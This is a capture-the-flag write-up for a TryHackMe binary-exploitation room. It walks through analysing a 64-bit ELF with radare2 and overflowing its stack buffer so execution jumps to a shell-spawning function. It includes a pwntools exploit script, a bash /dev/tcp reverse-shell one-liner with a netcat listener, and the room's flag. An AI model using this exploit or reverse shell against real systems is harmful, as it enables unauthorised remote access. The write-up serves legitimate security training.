### Task 1

#### Analyze the binary offline.

`rabin2 -I DearQA.DearQA`

### Task 2

#### What is the binary architecture ?

It's an ELF-64 binary.

#### What is the flag ?

Start by scanning the machine :

`nmap -v -p 5700 10.10.76.213`
> PORT     STATE SERVICE
> 
> 5700/tcp open  supportassist
> 
> MAC Address: 02:4B:83:7C:26:87 (Unknown)

Add -sV to see the version :
`nmap -v -p 5700 -sV 10.10.76.213`

Try also `nmap -v -p 5700 -A 10.10.76.213`

In the output : "x86_64-pc-linux-gnu" => x64

`rabin2 -i DearQA.DearQA`
> [Imports]
> 
> nth vaddr      bind   type   lib name
> 
> -------------------------------------
> 
> 1   0x00400520 GLOBAL FUNC       puts
> 
> 2   0x00400530 GLOBAL FUNC       printf
> 
> 3   0x00400540 GLOBAL FUNC       \_\_libc_start_main
> 
> 4   0x00400550 GLOBAL FUNC       execve
> 
> 5   0x00400560 WEAK   NOTYPE     \_\_gmon_start__
> 
> 6   0x00400570 GLOBAL FUNC       fflush
> 
> 7   0x00400580 GLOBAL FUNC       \_\_isoc99_scanf

`rabin2 -z DearQA.DearQA`
> [Strings]
> 
> nth paddr      vaddr      len size section type  string
> 
> -------------------------------------------------------
> 
> 0   0x000007b8 0x004007b8 16  17   .rodata ascii Congratulations!
> 
> 1   0x000007d0 0x004007d0 40  41   .rodata ascii You have entered in the secret function!
> 
> 2   0x000007f9 0x004007f9 9   10   .rodata ascii /bin/bash

In Radare2 web, we can also see the strings in the tab "STR" :
> 0x4007b8 17 16 Congratulations!
> 
> 0x4007d0 41 40 You have entered in the secret function!
> 
> 0x4007f9 10 9 /bin/bash

In the tab "SYM", we can see this function (?) : 0x00400686 61 vuln

`r2 -A dearQA.dearQA`

`[0x00400590]> sf sym.vuln`

`[0x00400686]> pdf`

> / 61: sym.vuln ();
> 
> |           **0x00400686**      55             push rbp
> 
> |           0x00400687      4889e5         mov rbp, rsp
> 
> |           0x0040068a      bfb8074000     mov edi, str.Congratulations_ ; 0x4007b8 ; **"Congratulations!"** ; const char \*s
> 
> |           0x0040068f      e88cfeffff     call sym.imp.puts           ; int puts(const char \*s)
> 
> |           0x00400694      bfd0074000     mov edi, str.You_have_entered_in_the_secret_function_ ; 0x4007d0 ; **"You have entered in the secret function!"** ; const char \*s
> 
> |           0x00400699      e882feffff     call sym.imp.puts           ; int puts(const char \*s)
> 
> |           0x0040069e      488b056b0520.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
> 
> |                                                                      ; [0x600c10:8]=0
> 
> |           0x004006a5      4889c7         mov rdi, rax                ; FILE \*stream
> 
> |           0x004006a8      e8c3feffff     call sym.imp.fflush         ; int fflush(FILE \*stream)
> 
> |           0x004006ad      ba00000000     mov edx, 0
> 
> |           0x004006b2      be00000000     mov esi, 0
> 
> |           0x004006b7      bff9074000     mov edi, str.\_bin_bash      ; 0x4007f9 ; **"/bin/bash"**
> 
> |           0x004006bc      e88ffeffff     call sym.imp.execve
> 
> |           0x004006c1      5d             pop rbp
> 
> \           0x004006c2      c3             ret

We want to create a buffer overflow to redirect the instruction pointer to the start of function `vuln` = 0x00400686.

First, use cyclic to find the length necessary to erase the instruction pointer :
`cyclic 100 > cyclic_100`

`gdb dearQA.dearQA`

`r < cyclic_100`

> Program received signal SIGSEGV, Segmentation fault.
> 
> 0x000000000040072f in main ()

`info registers`

> Register RSP = 0x0007ffffffffddb8 and contains is erased by "0x6161616161616166".

Python script to create our payload :
`from pwn import *`

`padding = cyclic(cyclic_find('0x6161616161616166')) # create a padding with the right size.`

`eip = p64(0x00400686)	# to override the IP with address 0x00400686`

`payload = padding + eip # the payload`

`print(payload)`

`python create_payload.py > payload`

Our payload is ready.

Note that cyclic_find('0x6161616161616166') is 40 byte long. We can also deduce the size required for padding by analyzing the beginning of function main :
`main proc near`

`var_20= byte ptr -20h`

`push    rbp 		; rbp is an 8-byte register, so rsp-=8`

`mov     rbp, rsp`

`sub     rsp, 20h	; rsp -= 0x20`

8 + 0x20 = 8+ 32 = 40 added to the stack.

Next, connect to the remote machine/service and deliver the payload :
`from pwn import *`

`connect = remote('10.10.220.178', 5700)`

`connect.recvuntil(b"What's your name: ")`

`padding = cyclic(cyclic_find('0x6161616161616166')) # create a padding with the right size.`

`print(padding)`

`payload = padding + p64(0x00400686)`

`connect.sendline(payload)`

`connect.interactive()`

On the AttackBox : `nc -nlvp 1234`

> Listening on [0.0.0.0] (family 0, port 1234)> 

In the shell opened on the target machine :
`bash -c "bash -i >& /dev/tcp/#replace_with_attackbox_IP#/1234 0>&1"`

Back on the AttackBox :
> Listening on [0.0.0.0] (family 0, port 1234)
> 
> Connection from 10.10.220.178 60654 received!
> 
> bash: cannot set terminal process group (448): Inappropriate ioctl for device
> 
> bash: no job control in this shell
 
`ctf@dearqa:/home/ctf$ whoami `

> ctf

`ctf@dearqa:/home/ctf$ ls`

> DearQA
> 
> dearqa.c
> 
> flag.txt

`ctf@dearqa:/home/ctf$ cat flag.txt`

> THM{PWN_1S_V3RY_E4SY}
